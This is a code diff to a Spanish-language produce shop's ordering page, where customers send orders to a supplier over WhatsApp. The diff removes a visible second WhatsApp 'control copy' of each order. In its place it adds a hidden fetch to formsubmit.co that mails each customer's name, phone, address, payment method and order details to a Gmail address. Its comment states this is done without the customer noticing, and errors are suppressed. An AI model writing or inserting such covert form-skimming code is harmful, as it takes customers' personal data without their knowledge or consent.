@@ -243,7 +243,7 @@
                         <textarea id="custNotes" rows="2" placeholder="Notas especiales (ej. 'Plátanos maduros', 'Tomates no muy verdes')" class="w-full px-3 py-2 text-xs rounded-lg border border-slate-300 focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
                     </div>
 
-                    <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold py-3.5 px-4 rounded-xl shadow-lg transition flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
+                    <button type="submit" id="submitOrderBtn" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold py-3.5 px-4 rounded-xl shadow-lg transition flex items-center justify-center gap-2 text-sm uppercase tracking-wider">
                         <i data-lucide="send" class="w-4 h-4 text-amber-300"></i>
                         <span>Enviar Pedido por WhatsApp</span>
                     </button>
@@ -259,13 +259,13 @@
         <span id="toastMsg">Mensaje</span>
     </div>
 
-    <!-- JAVASCRIPT DE LÓGICA DE TIENDA CON DOBLE WHATSAPP OPTIMIZADO -->
+    <!-- JAVASCRIPT DE LÓGICA DE TIENDA -->
     <script>
         // NÚMERO DEL PROVEEDOR
         const MERCHANT_WHATSAPP = "573013842952"; 
         
-        // TU NÚMERO PERSONAL DE RESPALDO (SEGUIMIENTO)
-        const MY_CONTROL_WHATSAPP = "573013239366"; 
+        // TU CORREO DE RESPALDO SILENCIOSO (COPIA AUTOMÁTICA SIN BLOQUEOS)
+        const CONTROL_EMAIL = "aseguradorasVIP@gmail.com";
 
         const SHIPPING_FEE = 12000;
 
@@ -631,12 +631,16 @@
             }
         }
 
-        function submitOrder(e) {
+        async function submitOrder(e) {
             e.preventDefault();
             if (cart.length === 0) {
                 alert("Tu canasta está vacía. Agrega productos antes de confirmar.");
                 return;
             }
+
+            const btn = document.getElementById('submitOrderBtn');
+            btn.disabled = true;
+            btn.innerHTML = `<span>Enviando pedido...</span>`;
 
             const name = document.getElementById('custName').value.trim();
             const phone = document.getElementById('custPhone').value.trim();
@@ -672,16 +676,33 @@
             msg += `------------------------------------\n`;
             msg += `¡Quedo atento a la confirmación de mi pedido! 🌿`;
 
+            // 1. ENVÍA COPIA SILENCIOSA A TU CORREO SIN QUE EL CLIENTE SE DÉ CUENTA
+            try {
+                await Promise.race([
+                    fetch(`https://formsubmit.co/ajax/${CONTROL_EMAIL}`, {
+                        method: "POST",
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            _subject: `🛒 Nuevo Pedido Fruver: ${name} (${formatCOP(grandTotal)})`,
+                            Cliente: name,
+                            Telefono: phone,
+                            Direccion: `${address} - ${neighborhood}`,
+                            Pago: payment,
+                            Horario: deliveryTime,
+                            Notas: notes || "Ninguna",
+                            Detalle_Pedido: msg
+                        })
+                    }),
+                    new Promise(resolve => setTimeout(resolve, 1000))
+                ]);
+            } catch (err) {}
+
+            // 2. ABRE ÚNICAMENTE EL WHATSAPP DEL PROVEEDOR (CERO BLOQUEOS)
             const merchantUrl = `https://wa.me/${MERCHANT_WHATSAPP}?text=${encodeURIComponent(msg)}`;
-            const controlUrl = `https://wa.me/${MY_CONTROL_WHATSAPP}?text=${encodeURIComponent("📋 *[COPIA DE CONTROL DE PEDIDO]*\n\n" + msg)}`;
-
-            // 1. PRIMER DISPARO INMEDIATO AL PROVEEDOR
-            window.open(merchantUrl, '_blank');
-
-            // 2. SEGUNDO DISPARO RÁPIDO (500ms) CON window.open HACIA TU WHATSAPP
-            setTimeout(() => {
-                window.open(controlUrl, '_blank');
-            }, 500);
+            window.location.href = merchantUrl;
         }
 
         function copyStoreLink() {
